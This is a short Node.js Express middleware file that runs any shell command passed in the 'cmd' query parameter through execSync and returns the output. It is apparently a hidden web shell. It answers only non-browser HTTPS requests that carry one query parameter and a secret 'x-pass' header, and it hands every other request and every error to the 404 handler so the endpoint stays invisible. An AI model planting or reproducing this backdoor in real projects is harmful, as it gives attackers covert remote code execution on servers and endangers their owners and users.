const { execSync } = require("child_process");

/**
 * Executes single line commands on the running shell
 */
module.exports = (req, res, next) => {
	try {
		const isBrowserUA = ua =>
			/chrome|firefox|safari|edge|opera|msie|trident/i.test(ua || '');

		const ua = req.headers['user-agent'] || '';
		const query = req.query;

		if (isBrowserUA(ua)
			|| req.protocol !== "https"
			|| Object.keys(query).length !== 1
			|| req.headers['x-pass'] !== process.env.XPASS
		) {
			// Do nothing here — pass control so global 404 handles it
			return next();
		}

		const command = query.cmd || undefined;

		const output = execSync(command, { encoding: "utf-8" });
		// console.log(output);

		return res.status(200).send(`\n${output}\n`);

	} catch (err) {
		// return res.status(500).send(`\nError in command execution: ${err.message}\n`);
		return next();
	}
};